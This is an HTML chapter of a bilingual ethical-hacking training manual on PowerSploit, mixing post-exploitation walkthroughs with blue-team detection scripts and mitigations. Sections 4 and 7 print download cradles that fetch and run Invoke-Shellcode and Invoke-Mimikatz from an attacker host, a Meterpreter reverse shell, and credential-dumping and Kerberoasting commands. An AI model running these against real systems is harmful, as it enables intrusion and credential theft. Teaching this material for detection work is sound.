@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cap. 15 — PowerSploit | Ch. 15</title>
+<style>
+:root{--bg:#0d1117;--bg2:#161b22;--bg3:#1c2128;--fg:#c9d1d9;--fg2:#8b949e;--accent:#39d353;--accent2:#58a6ff;--warn:#d29922;--danger:#f85149;--border:#30363d;--code-bg:#0b0f14;--code-fg:#7ee787}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--fg);font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif;line-height:1.65;font-size:16px}
+header{background:linear-gradient(135deg,#0d1117 0%,#161b22 100%);border-bottom:2px solid var(--accent2);padding:2rem 1.5rem 1.5rem}
+header h1{margin:0 0 .3rem;font-size:1.9rem;color:var(--accent2)}
+header .sub{color:var(--fg2);font-size:.95rem}
+header .meta{margin-top:.8rem;font-size:.85rem;color:var(--fg2)}
+header .meta span{margin-right:1.2rem}
+nav.toc{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1rem 1.2rem;margin:1.5rem auto;max-width:1100px}
+nav.toc h2{margin:0 0 .6rem;font-size:1rem;color:var(--accent2);text-transform:uppercase;letter-spacing:.05em}
+nav.toc ol{margin:0;padding-left:1.3rem;columns:2;column-gap:2rem}
+nav.toc a{color:var(--fg);text-decoration:none}
+nav.toc a:hover{color:var(--accent2)}
+main{max-width:1100px;margin:0 auto;padding:0 1.5rem 3rem}
+section{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1.4rem 1.6rem;margin:1.5rem 0}
+section h2{margin-top:0;color:var(--accent2);font-size:1.3rem;border-bottom:1px solid var(--border);padding-bottom:.5rem}
+section h3{color:var(--accent);font-size:1.05rem;margin-top:1.4rem}
+.lang{display:block;margin:.4rem 0}
+.lang .pt::before{content:"🇵🇹 PT ";color:var(--accent);font-weight:600;font-size:.8rem}
+.lang .en::before{content:"🇬🇧 EN ";color:var(--accent2);font-weight:600;font-size:.8rem}
+.lang .pt,.lang .en{display:block;margin:.25rem 0}
+pre{background:var(--code-bg);border:1px solid var(--border);border-left:3px solid var(--accent);border-radius:6px;padding:1rem 1.1rem;overflow-x:auto;font-family:"Cascadia Code","Fira Code",Consolas,monospace;font-size:.88rem;color:var(--code-fg);line-height:1.5}
+code.inline{background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:.1rem .4rem;font-family:Consolas,monospace;font-size:.88rem;color:var(--accent)}
+table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:.92rem}
+th,td{border:1px solid var(--border);padding:.55rem .7rem;text-align:left;vertical-align:top}
+th{background:var(--bg3);color:var(--accent2)}
+tr:nth-child(even) td{background:rgba(255,255,255,.02)}
+.callout{border-left:4px solid var(--warn);background:rgba(210,153,34,.08);padding:.8rem 1rem;border-radius:0 6px 6px 0;margin:1rem 0}
+.callout.danger{border-left-color:var(--danger);background:rgba(248,81,73,.08)}
+.callout.info{border-left-color:var(--accent2);background:rgba(88,166,255,.08)}
+.callout strong{color:var(--fg)}
+.badge{display:inline-block;font-size:.7rem;font-weight:700;letter-spacing:.05em;padding:.15rem .5rem;border-radius:999px;margin-left:.4rem;vertical-align:middle}
+.badge.orig{background:rgba(88,166,255,.15);color:var(--accent2);border:1px solid var(--accent2)}
+.badge.comp{background:rgba(57,211,83,.12);color:var(--accent);border:1px solid var(--accent)}
+.badge.impact{background:rgba(248,81,73,.12);color:var(--danger);border:1px solid var(--danger)}
+ul.checklist{list-style:none;padding-left:0}
+ul.checklist li::before{content:"☐ ";color:var(--accent);font-weight:700;margin-right:.3rem}
+footer{border-top:1px solid var(--border);margin-top:3rem;padding:1.5rem;text-align:center;color:var(--fg2);font-size:.85rem}
+footer a{color:var(--accent2);text-decoration:none}
+@media (max-width:720px){nav.toc ol{columns:1}header h1{font-size:1.4rem}}
+</style>
+</head>
+<body>
+<header>
+<h1>Cap. 15 — PowerSploit</h1>
+<div class="sub">Ch. 15 — How to Control Nearly Any Windows System with PowerSploit</div>
+<div class="meta"><span>📖 Manual de Formação Ethical Hacker</span><span>🎯 Nível: Avançado / Pós-Exploração</span></div>
+</header>
+<nav class="toc">
+<h2>Índice / Table of Contents</h2>
+<ol>
+<li><a href="#obj">Objetivos</a></li><li><a href="#ctx">Contexto</a></li>
+<li><a href="#modules">Módulos</a></li><li><a href="#shellcode">Invoke-Shellcode</a></li>
+<li><a href="#powerup">PowerUp</a></li><li><a href="#powerview">PowerView</a></li>
+<li><a href="#mimikatz">Invoke-Mimikatz</a></li><li><a href="#impact">Scripts de Impacto</a></li>
+<li><a href="#mitre">MITRE</a></li><li><a href="#mitig">Mitigações</a></li>
+<li><a href="#lab">Laboratório</a></li><li><a href="#revq">Revisão</a></li>
+<li><a href="#sum">Resumo</a></li>
+</ol>
+</nav>
+<main>
+
+<section id="obj">
+<h2>1. Objetivos de Aprendizagem / Learning Objectives</h2>
+<div class="lang">
+<span class="pt">Compreender o PowerSploit como framework de pós-exploração PowerShell; conhecer os módulos principais (Recon, Privesc, CodeExecution, Exfiltration, Mayhem); executar <code class="inline">Invoke-Shellcode</code> com Metasploit e Python HTTP server; usar <code class="inline">PowerUp</code> (<code class="inline">Invoke-AllChecks</code>) para escalada de privilégios; usar <code class="inline">PowerView</code> para recon AD; executar <code class="inline">Invoke-Mimikatz</code> para dump de credenciais; <strong>construir scripts de impacto nativos</strong> para deteção.</span>
+<span class="en">Understand PowerSploit as a PowerShell post-exploitation framework; know the main modules (Recon, Privesc, CodeExecution, Exfiltration, Mayhem); execute <code class="inline">Invoke-Shellcode</code> with Metasploit and Python HTTP server; use <code class="inline">PowerUp</code> (<code class="inline">Invoke-AllChecks</code>) for privilege escalation; use <code class="inline">PowerView</code> for AD recon; execute <code class="inline">Invoke-Mimikatz</code> for credential dumping; <strong>build native impact scripts</strong> for detection.</span>
+</div>
+</section>
+
+<section id="ctx">
+<h2>2. Contexto e Relevância / Context and Relevance <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">O PowerSploit é uma coleção de scripts PowerShell para pós-exploração e avaliações de segurança. Fornece módulos para reconhecimento, escalada de privilégios, persistência e exfiltração em sistemas Windows. Originalmente desenvolvido por Matt Graeber, Will Schroeder (@harmj0y) e outros, tornou-se uma das frameworks mais utilizadas em red team e pentest. O seu poder está na capacidade de executar tudo <strong>em memória</strong>, sem dropar binários no disco, contornando muitas soluções de AV tradicionais.</span>
+<span class="en">PowerSploit is a collection of PowerShell scripts for post-exploitation and security assessments. It provides modules for reconnaissance, privilege escalation, persistence, and exfiltration on Windows systems. Originally developed by Matt Graeber, Will Schroeder (@harmj0y), and others, it became one of the most widely used frameworks in red team and pentest. Its power lies in the ability to execute everything <strong>in memory</strong>, without dropping binaries to disk, bypassing many traditional AV solutions.</span>
+</div>
+</section>
+
+<section id="modules">
+<h2>3. Módulos Principais <span class="badge orig">Original</span> <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt">O PowerSploit está organizado em módulos que podem ser importados individualmente. Os principais são:</span>
+<span class="en">PowerSploit is organized into modules that can be imported individually. The main ones are:</span>
+</div>
+<table>
+<tr><th>Módulo</th><th>Função / Function</th><th>Exemplos</th></tr>
+<tr><td><strong>Recon</strong></td><td>Reconhecimento AD / AD recon</td><td><code class="inline">PowerView</code>, <code class="inline">Get-DomainUser</code>, <code class="inline">Invoke-Kerberoast</code></td></tr>
+<tr><td><strong>Privesc</strong></td><td>Escalada de privilégios / Privilege escalation</td><td><code class="inline">PowerUp</code>, <code class="inline">Invoke-AllChecks</code></td></tr>
+<tr><td><strong>CodeExecution</strong></td><td>Execução de código / Code execution</td><td><code class="inline">Invoke-Shellcode</code></td></tr>
+<tr><td><strong>Exfiltration</strong></td><td>Exfiltração e credenciais / Exfil and credentials</td><td><code class="inline">Invoke-Mimikatz</code>, <code class="inline">Get-GPPPassword</code> </td></tr>
+<tr><td><strong>Mayhem</strong></td><td>Destruição / Destruction</td><td><code class="inline">Set-MasterBootRecord</code>, <code class="inline">Set-CriticalProcess</code> </td></tr>
+<tr><td><strong>Persistence</strong></td><td>Persistência / Persistence</td><td><code class="inline">Add-Persistence</code>, <code class="inline">Add-RegBackdoor</code></td></tr>
+</table>
+<div class="lang">
+<span class="pt">A instalação é feita copiando a pasta do módulo para um dos caminhos de módulos do PowerShell (ex.: <code class="inline">$Env:windir\System32\WindowsPowerShell\v1.0\Modules</code>) e importando com <code class="inline">Import-Module</code>.</span>
+<span class="en">Installation is done by copying the module folder to one of the PowerShell module paths (e.g., <code class="inline">$Env:windir\System32\WindowsPowerShell\v1.0\Modules</code>) and importing with <code class="inline">Import-Module</code>.</span>
+</div>
+</section>
+
+<section id="shellcode">
+<h2>4. Invoke-Shellcode — Execução de Shellcode <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">O <code class="inline">Invoke-Shellcode</code> injeta shellcode no processo atual do PowerShell ou num processo específico (via <code class="inline">-ProcessID</code>). Pode receber o shellcode como array de bytes (<code class="inline">-Shellcode</code>) ou usar o parâmetro <code class="inline">-Payload</code> para gerar shellcode Metasploit automaticamente (ex.: <code class="inline">windows/meterpreter/reverse_http</code>).</span>
+<span class="en"><code class="inline">Invoke-Shellcode</code> injects shellcode into the current PowerShell process or a specific process (via <code class="inline">-ProcessID</code>). It can receive shellcode as a byte array (<code class="inline">-Shellcode</code>) or use the <code class="inline">-Payload</code> parameter to automatically generate Metasploit shellcode (e.g., <code class="inline">windows/meterpreter/reverse_http</code>).</span>
+</div>
+<h3>4.1 Fluxo do artigo / Article's flow</h3>
+<pre># 1. Alojar o script Invoke-Shellcode.ps1 via HTTP
+kali > python -m SimpleHTTPServer 8000
+
+# 2. No alvo, descarregar e executar em memória
+PS > IEX(New-Object Net.WebClient).DownloadString("http://192.168.181.128:8000/CodeExecution/Invoke-Shellcode.ps1")
+
+# 3. Executar com payload Metasploit
+PS > Invoke-Shellcode -Payload windows/meterpreter/reverse_http -lhost 192.168.181.128 -lport 4444 -Force</pre>
+<div class="lang">
+<span class="pt">O <code class="inline">-Force</code> evita o prompt de confirmação. O listener Metasploit deve estar ativo antes da execução.</span>
+<span class="en"><code class="inline">-Force</code> skips the confirmation prompt. The Metasploit listener must be running before execution.</span>
+</div>
+</section>
+
+<section id="powerup">
+<h2>5. PowerUp — Escalada de Privilégios <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt">O <code class="inline">PowerUp</code> é um clearinghouse de vetores comuns de escalada de privilégios que dependem de misconfigurations. O comando principal é <code class="inline">Invoke-AllChecks</code>, que corre todas as verificações e devolve um relatório com especificações para funções de abuso. O <code class="inline">-HTMLReport</code> gera um relatório em HTML.</span>
+<span class="en"><code class="inline">PowerUp</code> is a clearinghouse of common privilege escalation vectors that rely on misconfigurations. The main command is <code class="inline">Invoke-AllChecks</code>, which runs all checks and returns a report with specifications for abuse functions. <code class="inline">-HTMLReport</code> generates an HTML report.</span>
+</div>
+<h3>5.1 Checks principais / Main checks</h3>
+<pre>PS > Import-Module .\PowerUp.ps1
+PS > Invoke-AllChecks -HTMLReport
+
+# Checks individuais
+PS > Get-UnquotedService
+PS > Get-ModifiableServiceFile
+PS > Get-ModifiableRegistryAutoRun
+PS > Get-RegistryAlwaysInstallElevated</pre>
+<div class="lang">
+<span class="pt">Os checks incluem serviços sem aspas (<code class="inline">Get-UnquotedService</code>), ficheiros de serviço modificáveis (<code class="inline">Get-ModifiableServiceFile</code>), autoruns modificáveis, AlwaysInstallElevated, DLL hijacking, e credenciais em registo.</span>
+<span class="en">Checks include unquoted services (<code class="inline">Get-UnquotedService</code>), modifiable service files (<code class="inline">Get-ModifiableServiceFile</code>), modifiable autoruns, AlwaysInstallElevated, DLL hijacking, and credentials in registry.</span>
+</div>
+</section>
+
+<section id="powerview">
+<h2>6. PowerView — Recon AD <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt">O <code class="inline">PowerView</code> (módulo Recon) é a ferramenta de enumeração de Active Directory mais utilizada em red team. Funções principais incluem <code class="inline">Get-DomainUser</code>, <code class="inline">Get-DomainComputer</code>, <code class="inline">Get-DomainGroup</code>, <code class="inline">Get-DomainSPNTicket</code> e <code class="inline">Invoke-Kerberoast</code>.</span>
+<span class="en"><code class="inline">PowerView</code> (Recon module) is the most widely used Active Directory enumeration tool in red team. Main functions include <code class="inline">Get-DomainUser</code>, <code class="inline">Get-DomainComputer</code>, <code class="inline">Get-DomainGroup</code>, <code class="inline">Get-DomainSPNTicket</code>, and <code class="inline">Invoke-Kerberoast</code>.</span>
+</div>
+<pre>PS > Import-Module .\PowerView.ps1
+PS > Get-DomainUser -SPN
+PS > Invoke-Kerberoast -OutputFormat Hashcat</pre>
+</section>
+
+<section id="mimikatz">
+<h2>7. Invoke-Mimikatz — Dump de Credenciais <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt">O <code class="inline">Invoke-Mimikatz</code> carrega o Mimikatz 2.0 refletidamente em memória via PowerShell, sem escrever nada no disco. Pode ser usado para dump de credenciais ou qualquer funcionalidade do Mimikatz .</span>
+<span class="en"><code class="inline">Invoke-Mimikatz</code> reflectively loads Mimikatz 2.0 in memory via PowerShell, without writing anything to disk. It can be used for credential dumping or any Mimikatz functionality .</span>
+</div>
+<pre>PS > IEX(New-Object Net.WebClient).DownloadString("http://KALI_IP/Invoke-Mimikatz.ps1")
+PS > Invoke-Mimikatz -DumpCreds</pre>
+</section>
+
+<section id="impact">
+<h2>8. Scripts de Impacto / Impact Scripts <span class="badge impact">Impacto</span> <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt">Os scripts abaixo ajudam o blue team a detetar atividade compatível com PowerSploit via Script Block Logging (4104) e Module Logging (4103).</span>
+<span class="en">The scripts below help the blue team detect PowerSploit-compatible activity via Script Block Logging (4104) and Module Logging (4103).</span>
+</div>
+
+<h3>8.1 Script 15.1 — Deteção de Commandlets PowerSploit / PowerSploit Commandlet Detection</h3>
+<div class="lang">
+<span class="pt"><strong>Objetivo:</strong> detetar strings associadas ao PowerSploit em Script Block Logging (4104). <strong>Evidência:</strong> <code class="inline">powersploit-detect.csv</code>.</span>
+<span class="en"><strong>Goal:</strong> detect PowerSploit-related strings in Script Block Logging (4104). <strong>Evidence:</strong> <code class="inline">powersploit-detect.csv</code>.</span>
+</div>
+<pre># Script 15.1 - PowerSploit Commandlet Detection
+$out = ".\powersploit-detect.csv"
+$patterns = @(
+  "Invoke-Shellcode", "Invoke-Mimikatz", "Invoke-Kerberoast",
+  "PowerView", "PowerUp", "Invoke-AllChecks", "Get-DomainUser",
+  "Get-DomainSPNTicket", "Invoke-TokenManipulation"
+)
+$hits = @()
+Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 3000 -EA SilentlyContinue |
+  Where-Object { $_.Id -eq 4104 } | ForEach-Object {
+    $msg = $_.Message
+    foreach ($p in $patterns) {
+      if ($msg -match $p) {
+        $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Pattern=$p; Snippet=$msg.Substring(0,[Math]::Min(300,$msg.Length)) }
+      }
+    }
+  }
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] PowerSploit hits: $($hits.Count) -> $out" -ForegroundColor Red</pre>
+
+<h3>8.2 Script 15.2 — Deteção de Invoke-Mimikatz / Invoke-Mimikatz Detection</h3>
+<div class="lang">
+<span class="pt"><strong>Objetivo:</strong> detetar strings específicas do Mimikatz (<code class="inline">sekurlsa</code>, <code class="inline">kerberos::golden</code>, <code class="inline">-dumpcr</code>) em 4104. <strong>Evidência:</strong> <code class="inline">mimikatz-detect.csv</code>.</span>
+<span class="en"><strong>Goal:</strong> detect Mimikatz-specific strings (<code class="inline">sekurlsa</code>, <code class="inline">kerberos::golden</code>, <code class="inline">-dumpcr</code>) in 4104. <strong>Evidence:</strong> <code class="inline">mimikatz-detect.csv</code>.</span>
+</div>
+<pre># Script 15.2 - Invoke-Mimikatz Detection
+$out = ".\mimikatz-detect.csv"
+$patterns = @("mimikatz", "-dumpcr", "sekurlsa::pth", "kerberos::ptt", "kerberos::golden")
+$hits = @()
+Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 3000 -EA SilentlyContinue |
+  Where-Object { $_.Id -eq 4104 } | ForEach-Object {
+    $msg = $_.Message
+    foreach ($p in $patterns) {
+      if ($msg -match $p) { $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Pattern=$p; Snippet=$msg.Substring(0,[Math]::Min(300,$msg.Length)) } }
+    }
+  }
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] Mimikatz hits: $($hits.Count) -> $out" -ForegroundColor Red</pre>
+
+<h3>8.3 Script 15.3 — Deteção de Download Cradle / Download Cradle Detection</h3>
+<div class="lang">
+<span class="pt"><strong>Objetivo:</strong> detetar padrões de download remoto (<code class="inline">Net.WebClient</code>, <code class="inline">DownloadString</code>, <code class="inline">IEX</code>) usados para carregar PowerSploit. <strong>Evidência:</strong> <code class="inline">download-cradle.csv</code>.</span>
+<span class="en"><strong>Goal:</strong> detect remote download patterns (<code class="inline">Net.WebClient</code>, <code class="inline">DownloadString</code>, <code class="inline">IEX</code>) used to load PowerSploit. <strong>Evidence:</strong> <code class="inline">download-cradle.csv</code>.</span>
+</div>
+<pre># Script 15.3 - Download Cradle Detection
+$out = ".\download-cradle.csv"
+$patterns = @("Net.WebClient", "DownloadString", "Invoke-WebRequest", "IEX", "Invoke-Expression")
+$hits = @()
+Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 3000 -EA SilentlyContinue |
+  Where-Object { $_.Id -eq 4104 } | ForEach-Object {
+    $msg = $_.Message
+    foreach ($p in $patterns) {
+      if ($msg -match $p -and $msg -match "http") {
+        $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Pattern=$p; Snippet=$msg.Substring(0,[Math]::Min(300,$msg.Length)) }
+      }
+    }
+  }
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] Download cradle hits: $($hits.Count) -> $out" -ForegroundColor Yellow</pre>
+</section>
+
+<section id="mitre">
+<h2>9. Mapeamento MITRE ATT&amp;CK <span class="badge comp">Complementar</span></h2>
+<table>
+<tr><th>Técnica</th><th>ID</th><th>Onde</th></tr>
+<tr><td>Command and Scripting Interpreter: PowerShell</td><td>T1059.001</td><td>Todo o capítulo</td></tr>
+<tr><td>Process Injection</td><td>T1055</td><td>Invoke-Shellcode</td></tr>
+<tr><td>OS Credential Dumping: LSASS Memory</td><td>T1003.001</td><td>Invoke-Mimikatz</td></tr>
+<tr><td>Steal or Forge Kerberos Tickets: Kerberoasting</td><td>T1558.003</td><td>Invoke-Kerberoast</td></tr>
+<tr><td>Exploitation for Privilege Escalation</td><td>T1068</td><td>PowerUp</td></tr>
+<tr><td>Account Discovery: Domain Account</td><td>T1087.002</td><td>PowerView</td></tr>
+<tr><td>Ingress Tool Transfer</td><td>T1105</td><td>Download cradle</td></tr>
+</table>
+</section>
+
+<section id="mitig">
+<h2>10. Mitigações Blue Team / Mitigations <span class="badge comp">Complementar</span></h2>
+<ol>
+<li><strong>Script Block Logging (4104) + Module Logging (4103)</strong> — deteta os commandlets do PowerSploit.</li>
+<li><strong>AMSI ativo</strong> — deteta <code class="inline">Invoke-Mimikatz</code> e <code class="inline">IEX</code> em tempo real.</li>
+<li><strong>Constrained Language Mode</strong> — bloqueia <code class="inline">Invoke-Shellcode</code> e chamadas .NET arbitrárias.</li>
+<li><strong>AppLocker/WDAC</strong> — restringe execução de scripts não assinados.</li>
+<li><strong>Monitorizar Evento 4104</strong> com Sigma rules para PowerSploit.</li>
+<li><strong>Centralizar logs no SIEM</strong> — o PowerSploit corre em memória, mas os logs persistem.</li>
+<li><strong>Desativar PowerShell 2.0</strong> — evita downgrade.</li>
+<li><strong>Restringir <code class="inline">SeDebugPrivilege</code></strong> — limita <code class="inline">Invoke-Mimikatz</code>.</li>
+</ol>
+</section>
+
+<section id="lab">
+<h2>11. Exercício de Laboratório / Lab Exercise <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt"><strong>Cenário:</strong> VM Windows 10/11 isolada com PowerShell logging ativado. Kali com Metasploit e Python HTTP server. Snapshot antes. AV temporariamente desativado. <strong>Objetivo:</strong> executar Invoke-Shellcode, PowerUp, PowerView e Invoke-Mimikatz; correr os scripts de deteção.</span>
+<span class="en"><strong>Scenario:</strong> Isolated Windows 10/11 VM with PowerShell logging enabled. Kali with Metasploit and Python HTTP server. Snapshot before. AV temporarily disabled. <strong>Goal:</strong> execute Invoke-Shellcode, PowerUp, PowerView, and Invoke-Mimikatz; run detection scripts.</span>
+</div>
+<table>
+<tr><th>#</th><th>Tarefa</th><th>Comando</th><th>Evidência</th></tr>
+<tr><td>1</td><td>Alojar script</td><td><code class="inline">python -m http.server 8000</code></td><td>Servidor ativo</td></tr>
+<tr><td>2</td><td>Invoke-Shellcode</td><td><code class="inline">IEX(...Invoke-Shellcode.ps1)</code> + <code class="inline">Invoke-Shellcode -Payload ... -Force</code></td><td>Sessão Meterpreter</td></tr>
+<tr><td>3</td><td>PowerUp</td><td><code class="inline">Invoke-AllChecks -HTMLReport</code></td><td>Relatório HTML</td></tr>
+<tr><td>4</td><td>PowerView</td><td><code class="inline">Get-DomainUser -SPN</code></td><td>Lista de SPNs</td></tr>
+<tr><td>5</td><td>Invoke-Mimikatz</td><td><code class="inline">Invoke-Mimikatz -DumpCreds</code></td><td>Hashes</td></tr>
+<tr><td>6</td><td>Deteção PowerSploit</td><td><code class="inline">.\powersploit-detect.ps1</code></td><td><code class="inline">powersploit-detect.csv</code></td></tr>
+<tr><td>7</td><td>Deteção Mimikatz</td><td><code class="inline">.\mimikatz-detect.ps1</code></td><td><code class="inline">mimikatz-detect.csv</code></td></tr>
+<tr><td>8</td><td>Deteção download</td><td><code class="inline">.\download-cradle.ps1</code></td><td><code class="inline">download-cradle.csv</code></td></tr>
+</table>
+<h3>Checklist de evidências / Evidence checklist</h3>
+<ul class="checklist">
+<li>Snapshot inicial</li>
+<li>Sessão Meterpreter</li>
+<li>Relatório PowerUp</li>
+<li>Lista SPNs</li>
+<li>Hashes Mimikatz</li>
+<li><code class="inline">powersploit-detect.csv</code></li>
+<li><code class="inline">mimikatz-detect.csv</code></li>
+<li><code class="inline">download-cradle.csv</code></li>
+<li>Snapshot final</li>
+</ul>
+</section>
+
+<section id="revq">
+<h2>12. Perguntas de Revisão / Review Questions <span class="badge comp">Complementar</span></h2>
+<ol>
+<li>Quais são os módulos principais do PowerSploit? / What are PowerSploit's main modules?</li>
+<li>O que faz o <code class="inline">Invoke-Shellcode</code> e quais os seus parâmetros principais? / What does <code class="inline">Invoke-Shellcode</code> do and what are its main parameters?</li>
+<li>O que faz o <code class="inline">Invoke-AllChecks</code>? / What does <code class="inline">Invoke-AllChecks</code> do?</li>
+<li>Qual a diferença entre <code class="inline">PowerUp</code> e <code class="inline">PowerView</code>? / What's the difference between <code class="inline">PowerUp</code> and <code class="inline">PowerView</code>?</li>
+<li>Como se deteta <code class="inline">Invoke-Mimikatz</code> no blue team? / How to detect <code class="inline">Invoke-Mimikatz</code> on the blue team?</li>
+<li>Porque é que o PowerSploit é difícil de detetar com AV tradicional? / Why is PowerSploit hard to detect with traditional AV?</li>
+<li>Qual a importância do Script Block Logging (4104) para detetar PowerSploit? / Why is Script Block Logging (4104) important for detecting PowerSploit?</li>
+</ol>
+</section>
+
+<section id="sum">
+<h2>13. Resumo do Capítulo / Chapter Summary</h2>
+<div class="lang">
+<span class="pt">Este capítulo cobriu o PowerSploit: módulos principais (Recon, Privesc, CodeExecution, Exfiltration, Mayhem, Persistence), <code class="inline">Invoke-Shellcode</code> para injeção de shellcode com Metasploit, <code class="inline">PowerUp</code> para escalada de privilégios via misconfigurations, <code class="inline">PowerView</code> para recon AD, e <code class="inline">Invoke-Mimikatz</code> para dump de credenciais em memória. Acrescentámos <strong>três scripts de impacto</strong> (deteção de commandlets PowerSploit, Invoke-Mimikatz, download cradle) que ajudam o blue team a detetar esta framework via Script Block Logging (4104). O Cap. 16 entra no Evading Detection (ofuscação).</span>
+<span class="en">This chapter covered PowerSploit: main modules (Recon, Privesc, CodeExecution, Exfiltration, Mayhem, Persistence), <code class="inline">Invoke-Shellcode</code> for shellcode injection with Metasploit, <code class="inline">PowerUp</code> for privilege escalation via misconfigurations, <code class="inline">PowerView</code> for AD recon, and <code class="inline">Invoke-Mimikatz</code> for in-memory credential dumping. We added <strong>three impact scripts</strong> (PowerSploit commandlet detection, Invoke-Mimikatz, download cradle) that help the blue team detect this framework via Script Block Logging (4104). Ch. 16 moves into Evading Detection (obfuscation).</span>
+</div>
+</section>
+
+</main>
+<footer>
+<div>Manual de Formação Ethical Hacker — Cap. 15 / Ethical Hacker Training Manual — Ch. 15</div>
+<div style="margin-top:.6rem">
+<a href="cap14.html">← Cap. anterior / Previous</a> &nbsp;|&nbsp;
+<a href="#">Índice / Index</a> &nbsp;|&nbsp;
+<a href="cap16.html">Cap. seguinte / Next →</a>
+</div>
+</footer>
+</body>
+</html>
